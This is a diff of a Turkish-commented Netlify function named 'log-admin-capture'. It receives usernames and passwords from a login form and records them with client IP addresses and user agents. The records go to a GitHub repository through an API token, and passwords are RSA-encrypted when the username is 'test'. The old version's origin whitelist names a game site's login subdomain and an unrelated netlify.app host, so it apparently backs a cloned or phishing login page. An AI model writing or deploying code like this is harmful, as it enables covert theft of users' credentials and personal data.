@@ -1,142 +1,182 @@
 // netlify/functions/log-admin-capture.js
-// Geçerli ADMIN yakalamasında GitHub'a yazar; diğer tüm durumlarda dosya yazmaz (ama 200 + reason döner).
+// Logs: logs/admin/<UTC-DAY>/<timestamp>.<status>.json
+// Status values: empty | too_short | non_admin | admin_probe (GET) | admin_ok (POST)
 
-const OWNER   = process.env.GITHUB_OWNER  || "Devrim-Sert";
-const REPO    = process.env.GITHUB_REPO   || "REPO";
-const LOG_DIR = process.env.LOG_DIR       || "logs/admin";
-const TOKEN   = process.env.GITHUB_TOKEN;
-const BRANCH  = process.env.GITHUB_BRANCH || "main";
+const crypto = require("crypto");
 
-// CSV ile ekstra whitelist (opsiyonel)
-const ORIGIN_WHITELIST_ENV = (process.env.ORIGIN_WHITELIST || "")
-  .split(",").map(s => s.trim()).filter(Boolean);
+// --- Public key helpers ------------------------------------------------------
+function normalizePem(input) {
+  if (!input) return "";
+  let s = String(input).trim();
+  // Çevresel tırnak/backtick gelmişse kırp
+  s = s.replace(/^['"`]+|['"`]+$/g, "");
+  // \r ve \n kaçışlarını gerçek newline'a çevir
+  s = s.replace(/\\r/g, "\r").replace(/\\n/g, "\n");
+  if (s.includes("BEGIN PUBLIC KEY")) return s;
 
-function parseHostname(u) {
-  try { return new URL(u).host.toLowerCase(); }
-  catch(_) { return (u || "").replace(/^https?:\/\//, "").toLowerCase(); }
+  // Sadece base64 gövde ise BEGIN/END ile sar
+  const body = s.replace(/[\r\n\s-]/g, "");
+  const chunks = body.match(/.{1,64}/g) || [];
+  return `-----BEGIN PUBLIC KEY-----\n${chunks.join("\n")}\n-----END PUBLIC KEY-----\n`;
 }
 
-function json(res) {
-  return { statusCode: 200, headers: {
-    "Access-Control-Allow-Origin": "*",
-    "Access-Control-Allow-Methods": "POST,OPTIONS",
-    "Access-Control-Allow-Headers": "Content-Type",
-    "Content-Type": "application/json"
-  }, body: JSON.stringify(res) };
+function pemFromEnv() {
+  const b64 = (process.env.AUDIT_PUBKEY_B64 || "").trim();
+  if (b64) {
+    try {
+      return Buffer.from(b64, "base64").toString("utf8");
+    } catch (e) {
+      console.error("AUDIT_PUBKEY_B64 decode failed:", e.message);
+    }
+  }
+  return normalizePem(process.env.AUDIT_PUBKEY_PEM || "");
 }
 
-function okMethod(method) { return method === "POST"; }
+// --- GitHub write helper -----------------------------------------------------
+async function writeToGithub(path, jsonObj) {
+  const owner  = process.env.GITHUB_OWNER;
+  const repo   = process.env.GITHUB_REPO;
+  const branch = process.env.GITHUB_BRANCH || "main";
+  const token  = process.env.GITHUB_TOKEN;
 
-function okOrigin(headers = {}) {
-  const originOrRef = (headers.origin || headers.referer || "").toString();
-  const incomingHost = (headers.host || "").toString().toLowerCase();
+  if (!owner || !repo || !token) {
+    console.error("Missing GitHub envs (GITHUB_OWNER/REPO/TOKEN)");
+    return { ok: false, status: 500, text: "Missing GitHub config" };
+  }
 
-  // Otomatik: gelen host'u whitelist'e dahil et
-  const allowedHosts = new Set([
-    "candid-capybara-606c8d.netlify.app",
-    "sonoyuncu.com.tr",
-    "giris.sonoyuncu.com.tr",
-    ...ORIGIN_WHITELIST_ENV.map(parseHostname),
-  ]);
-  if (incomingHost) allowedHosts.add(incomingHost);
+  const contentB64 = Buffer.from(JSON.stringify(jsonObj, null, 2)).toString("base64");
+  const url = `https://api.github.com/repos/${owner}/${repo}/contents/${encodeURIComponent(path)}`;
 
-  const refHost = parseHostname(originOrRef);
-  const pass = (incomingHost && allowedHosts.has(incomingHost)) ||
-               (refHost && allowedHosts.has(refHost));
-  return { pass, incomingHost, refHost, allowed: [...allowedHosts] };
-}
-
-function parseBody(body) {
-  try { return JSON.parse(body || "{}"); }
-  catch { return null; }
-}
-
-// Sadece username === "test" ve makul bir RSA-OAEP b64 varsa kabul
-function isAdminCapture(p) {
-  if (!p) return { ok:false, reason:"no_payload" };
-  if ((p.username || "").toLowerCase() !== "test") return { ok:false, reason:"username_not_test" };
-  if (typeof p.pw_enc_b64 !== "string") return { ok:false, reason:"pw_enc_b64_missing" };
-  if (p.pw_enc_b64.length < 300) return { ok:false, reason:"pw_enc_b64_too_short" };
-  try { Buffer.from(p.pw_enc_b64, "base64"); } catch { return { ok:false, reason:"pw_enc_b64_invalid_b64" }; }
-  return { ok:true };
-}
-
-function buildPath(now, payload) {
-  const day  = now.toISOString().slice(0,10);
-  const time = now.toISOString().replace(/[:.]/g,"-");
-  const nonce = payload && payload.nonce ? `-${payload.nonce}` : "";
-  return `${LOG_DIR}/${day}/${time}${nonce}.json`;
-}
-
-async function githubWrite(path, message, contentB64) {
-  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${encodeURI(path)}`;
   const res = await fetch(url, {
     method: "PUT",
     headers: {
-      "Authorization": `Bearer ${TOKEN}`,
+      Authorization: `Bearer ${token}`,
       "User-Agent": "netlify-fn",
-      "Accept": "application/vnd.github+json",
-      "X-GitHub-Api-Version": "2022-11-28",
-      "Content-Type": "application/json",
+      Accept: "application/vnd.github+json",
     },
-    body: JSON.stringify({ message, content: contentB64, branch: BRANCH }),
+    body: JSON.stringify({
+      message: `admin log ${jsonObj.ts} (${jsonObj.status})`,
+      content: contentB64,
+      branch,
+    }),
   });
+
   if (!res.ok) {
-    const text = await res.text().catch(() => "");
-    throw new Error(`GitHub write failed: ${res.status} ${text}`);
+    const txt = await res.text().catch(() => "");
+    console.error("GitHub write failed", res.status, txt.slice(0, 200));
+    return { ok: false, status: 502, text: "GitHub write failed" };
   }
+  return { ok: true, status: 200, text: "ok" };
+}
+
+// --- Status logic ------------------------------------------------------------
+function deriveStatus(user, pwLen, isPost) {
+  const u = (user || "").toLowerCase().trim();
+  if (!u || !pwLen) return "empty";
+  if (pwLen < 6) return "too_short";
+  if (u !== "test") return "non_admin";
+  return isPost ? "admin_ok" : "admin_probe";
 }
 
 exports.handler = async (event) => {
-  if (event.httpMethod === "OPTIONS") {
-    return { statusCode: 204, headers: {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "POST,OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    }};
-  }
-
-  if (!okMethod(event.httpMethod)) {
-    return json({ ok:false, reason:"method_not_post" });
-  }
-
-  const oc = okOrigin(event.headers || {});
-  if (!oc.pass) {
-    return json({ ok:false, reason:"origin_blocked", detail: { incomingHost: oc.incomingHost, refHost: oc.refHost } });
-  }
-
-  const payload = parseBody(event.body);
-  if (!payload) {
-    return json({ ok:false, reason:"body_not_json" });
-  }
-
-  // kind zorunlu değil; sadece username test + geçerli b64 yeter
-  const chk = isAdminCapture(payload);
-  if (!chk.ok) {
-    return json({ ok:false, reason: chk.reason });
-  }
-
-  if (!TOKEN) {
-    return json({ ok:false, reason:"missing_github_token" });
-  }
-
-  const now = new Date();
-  const path = buildPath(now, payload);
-  const contentObj = {
-    ts: now.toISOString(),
-    username: payload.username,
-    pw_enc_b64: payload.pw_enc_b64,
-    ua: (event.headers && event.headers["user-agent"]) || null,
-    ip: (event.headers && event.headers["x-nf-client-connection-ip"]) || null,
-    referer: (event.headers && event.headers.referer) || null,
-    host: (event.headers && event.headers.host) || null,
-  };
-  const contentB64 = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");
-
   try {
-    await githubWrite(path, `admin log ${now.toISOString()}`, contentB64);
-    return json({ ok:true, path });
+    // Common request metadata
+    const nowIso = new Date().toISOString();
+    const day = nowIso.slice(0, 10); // UTC gün
+    const tsSafe = nowIso.replace(/[:.]/g, "-");
+    const ip = event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "";
+    const ua = event.headers["user-agent"] || "";
+
+    // --- 0) GET ping: parola yok, sadece durum kaydı (artık empty LOG YAZMA) ---
+    if (event.httpMethod === "GET") {
+      const q = event.queryStringParameters || {};
+      const username = (q.u || "").toString().trim();
+      const pw_len = parseInt(q.l || "0", 10) || 0;
+
+      const status = deriveStatus(username, pw_len, /*isPost*/ false);
+
+      // >>> YENİ: empty ise yazma
+      if (status === "empty") {
+        return { statusCode: 204, body: "skip-empty" };
+      }
+
+      const rec = {
+        ts: nowIso,
+        user: username,
+        pw_len,
+        status,        // too_short | non_admin | admin_probe
+        ip,
+        ua,
+        via: "get",
+      };
+
+      const path = `logs/admin/${day}/${tsSafe}.${status}.json`;
+      const wr = await writeToGithub(path, rec);
+      return { statusCode: wr.status, body: wr.text === "ok" ? "ok-get" : wr.text };
+    }
+
+    // --- 1) POST: admin_ok için şifreyi şifrele, diğerlerinde parola yok ---
+    if (event.httpMethod !== "POST") {
+      return { statusCode: 405, body: "Method Not Allowed" };
+    }
+
+    let payload = {};
+    try { payload = JSON.parse(event.body || "{}"); }
+    catch { payload = {}; }
+
+    const username = (payload.username || "").toString().trim();
+    const password = typeof payload.password === "string" ? payload.password : null;
+    const pw_len = password ? password.length :
+                   Number.isFinite(payload.pw_len) ? payload.pw_len : 0;
+
+    let status = deriveStatus(username, pw_len, /*isPost*/ true);
+
+    // >>> YENİ: empty ise yazma
+    if (status === "empty") {
+      return { statusCode: 204, body: "skip-empty" };
+    }
+
+    const rec = {
+      ts: nowIso,
+      user: username,
+      pw_len,
+      status, // non_admin | too_short | admin_ok
+      ip,
+      ua,
+      via: "post",
+    };
+
+    if (status === "admin_ok") {
+      const pubPem = pemFromEnv();
+      if (!pubPem) return { statusCode: 500, body: "Missing public key" };
+
+      let key;
+      try { key = crypto.createPublicKey(pubPem); }
+      catch (e) {
+        console.error("createPublicKey failed:", e.message);
+        return { statusCode: 500, body: "Bad public key" };
+      }
+
+      let enc;
+      try {
+        enc = crypto.publicEncrypt(
+          { key, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
+          Buffer.from(password || "", "utf8")
+        );
+      } catch (e) {
+        console.error("publicEncrypt failed:", e.message);
+        return { statusCode: 500, body: "Encrypt failed" };
+      }
+
+      rec.pw_enc_b64 = enc.toString("base64");
+    }
+
+    const path = `logs/admin/${day}/${tsSafe}.${rec.status}.json`;
+    const wr = await writeToGithub(path, rec);
+    return { statusCode: wr.status, body: wr.text === "ok" ? "ok" : wr.text };
+
   } catch (e) {
-    return json({ ok:false, reason:"github_write_failed", error: e.message || "write_failed" });
+    console.error("server error:", e && e.stack ? e.stack : e);
+    return { statusCode: 500, body: "server error" };
   }
 };
